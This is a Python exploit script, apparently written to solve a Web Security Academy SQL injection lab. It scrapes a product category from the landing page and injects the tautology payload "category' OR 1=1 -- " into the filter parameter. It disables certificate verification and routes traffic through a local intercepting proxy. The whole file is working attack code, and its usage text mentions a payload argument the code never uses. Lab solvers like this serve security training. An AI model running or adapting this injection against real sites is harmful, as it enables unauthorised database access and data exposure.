#!/usr/bin/env python3
import sys
import warnings
from typing import Optional
from urllib.parse import urljoin

import requests
from bs4 import BeautifulSoup

# To suppress insecure requests warnings
warnings.filterwarnings("ignore", message="Unverified HTTPS request")
# import urllib3
# urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class LabExploit:
    def __init__(self, base_url: str) -> None:
        self.base_url = base_url.rstrip("/")
        self.session = requests.Session()
        self.session.headers.update(
            {"User-Agent": "Security-Scanner-v1", "Connection": "close"}
        )
        self.proxies = {
            "http": "http://127.0.0.1:8080",
            "https": "http://127.0.0.1:8080",
        }

    def send_request(
        self,
        endpoint: str,
        params: Optional[dict] = None,
        data: Optional[dict] = None,
        method: str = "GET",
    ) -> Optional[requests.Response]:
        """Helper manages all HTTP coomunication"""
        target_url = urljoin(self.base_url, endpoint)
        try:
            return self.session.request(
                method,
                target_url,
                params=params,
                data=data,
                timeout=(2, 5),
                allow_redirects=True,
                proxies=self.proxies,
                verify=False,
            )
        except requests.RequestException as e:
            print(f"[-] Connection error: {e}")
            return None

    def harvest_category(self) -> Optional[str]:
        """Harvests categories dynamically"""
        res = self.send_request("")
        if res is None or res.status_code != 200:
            print("[-] Unable to load landing page")
            return None
        soup = BeautifulSoup(res.text, "html.parser")
        categories = []
        for tag in soup.find_all("a", class_="filter-category"):
            name = tag.get_text(strip=True)
            if "All" not in name:
                categories.append(name)

        return min(categories, key=len) if categories else None

    def solve(self):
        category = self.harvest_category()
        if not category:
            print("[-] Could not find a valid category")
            return
        print(f"[+] Target category identified: {category}")

        # Inject Tautology Payload
        payload = f"{category}' OR 1=1 -- "
        res = self.send_request("filter", params={"category": payload})
        if res is None or res.status_code != 200:
            print(f"[-] Injection failed with payload: {payload}")

        # Pull the landing-page again to verify if lab is solved
        res = self.send_request("")
        if res is not None and "Congratulation" in res.text:
            print("[!] SUCCESS: Lab solved.")
        else:
            print("[-] SQL Injection Failed!")


def main():
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <url> <payload>")
        print(f"Example: {sys.argv[0]} https://lab-id.web-security-academy.net")
        sys.exit(1)

    url = sys.argv[1].strip()
    exploit = LabExploit(url)
    exploit.solve()


if __name__ == "__main__":
    main()
